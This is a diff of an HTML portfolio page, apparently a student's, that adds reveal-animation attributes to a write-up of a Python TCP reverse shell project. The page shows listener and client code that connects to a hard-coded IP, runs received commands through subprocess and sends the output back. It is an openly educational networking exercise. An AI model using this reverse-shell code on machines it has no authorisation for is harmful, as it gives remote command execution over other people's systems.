@@ -28,29 +28,29 @@
     </div>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Overview</p>
-      <h2 class="ds-section-title">Project Overview</h2>
-      <p class="ds-body">Implements a TCP-based reverse shell allowing remote command execution on the client's machine, illustrating raw socket handling, subprocess control, and directory navigation.</p>
-      <div class="ds-pill-row">
-        <span class="ds-pill">Python</span>
-        <span class="ds-pill">TCP Sockets</span>
-        <span class="ds-pill">Subprocess</span>
-        <span class="ds-pill">Security</span>
+      <p data-reveal class="ds-section-label">Overview</p>
+      <h2 data-reveal class="ds-section-title">Project Overview</h2>
+      <p data-reveal class="ds-body">Implements a TCP-based reverse shell allowing remote command execution on the client's machine, illustrating raw socket handling, subprocess control, and directory navigation.</p>
+      <div data-reveal-group class="ds-pill-row">
+        <span data-reveal class="ds-pill">Python</span>
+        <span data-reveal class="ds-pill">TCP Sockets</span>
+        <span data-reveal class="ds-pill">Subprocess</span>
+        <span data-reveal class="ds-pill">Security</span>
       </div>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Server</p>
-      <h2 class="ds-section-title">Server Implementation</h2>
-      <p class="ds-body">The server sets up a listener socket:</p>
-      <pre class="ds-code-block"><code>def createSocket():
+      <p data-reveal class="ds-section-label">Server</p>
+      <h2 data-reveal class="ds-section-title">Server Implementation</h2>
+      <p data-reveal class="ds-body">The server sets up a listener socket:</p>
+      <pre data-reveal class="ds-code-block"><code>def createSocket():
     global s, host, port
     host = ''
     port = 9999
     s = socket.socket()</code></pre>
-      <p class="ds-body">After binding and listening, it accepts incoming clients and forwards them to <code>socketAccept()</code> for command dispatch.</p>
-      <p class="ds-body">Once connected, it waits for commands from the client:</p>
-      <pre class="ds-code-block"><code>data = s.recv(1024)
+      <p data-reveal class="ds-body">After binding and listening, it accepts incoming clients and forwards them to <code>socketAccept()</code> for command dispatch.</p>
+      <p data-reveal class="ds-body">Once connected, it waits for commands from the client:</p>
+      <pre data-reveal class="ds-code-block"><code>data = s.recv(1024)
 if data[:2].decode() == 'cd':
     os.chdir(data[3:].decode())
 if len(data) > 0:
@@ -60,19 +60,19 @@ if len(data) > 0:
                            stderr=subprocess.PIPE)
     output = cmd.stdout.read() + cmd.stderr.read()
     s.send(str.encode(output.decode() + os.getcwd() + '> '))</code></pre>
-      <p class="ds-body">Commands are executed via <code>subprocess.Popen</code>, and combined stdout/stderr is sent back along with the updated working directory.</p>
+      <p data-reveal class="ds-body">Commands are executed via <code>subprocess.Popen</code>, and combined stdout/stderr is sent back along with the updated working directory.</p>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Client</p>
-      <h2 class="ds-section-title">Client Implementation</h2>
-      <p class="ds-body">The client initiates the reverse connection:</p>
-      <pre class="ds-code-block"><code>s = socket.socket()
+      <p data-reveal class="ds-section-label">Client</p>
+      <h2 data-reveal class="ds-section-title">Client Implementation</h2>
+      <p data-reveal class="ds-body">The client initiates the reverse connection:</p>
+      <pre data-reveal class="ds-code-block"><code>s = socket.socket()
 host = '10.48.64.73'
 port = 9999
 s.connect((host, port))</code></pre>
-      <p class="ds-body">It enters a loop receiving commands from the server and executing them locally:</p>
-      <pre class="ds-code-block"><code>while True:
+      <p data-reveal class="ds-body">It enters a loop receiving commands from the server and executing them locally:</p>
+      <pre data-reveal class="ds-code-block"><code>while True:
     data = s.recv(1024)
     if data[:2].decode() == 'cd':
         os.chdir(data[3:].decode())
@@ -87,21 +87,21 @@ s.connect((host, port))</code></pre>
     </section>
     <div class="ds-divider"></div>
     <section class="ds-section">
-      <p class="ds-section-label">Learnings</p>
-      <h2 class="ds-section-title">Key Takeaways</h2>
-      <div class="ds-highlight">
+      <p data-reveal class="ds-section-label">Learnings</p>
+      <h2 data-reveal class="ds-section-title">Key Takeaways</h2>
+      <div data-reveal class="ds-highlight">
         <ul>
           <li>Bi-directional command/control over raw TCP sockets.</li>
           <li>Subprocess management for remote shell execution.</li>
           <li>Dynamic working directory handling via remote <code>cd</code> commands.</li>
         </ul>
       </div>
-      <div class="ds-btn-row">
+      <div data-reveal class="ds-btn-row">
         <a href="https://github.com/gurumanie-singh/gurumanie-singh.github.io/tree/main/py-network-experiments/ReverseShell" target="_blank" rel="noopener noreferrer" class="ds-btn-primary">View Full Code on GitHub</a>
       </div>
     </section>
   </main>
-  <footer class="ds-footer">
+  <footer data-reveal class="ds-footer">
     <span class="ds-footer-logo">Gurumanie Singh Dhiman</span>
     <p class="ds-footer-text">© 2026 · Ames, Iowa · B.S. Computer Engineering</p>
   </footer>
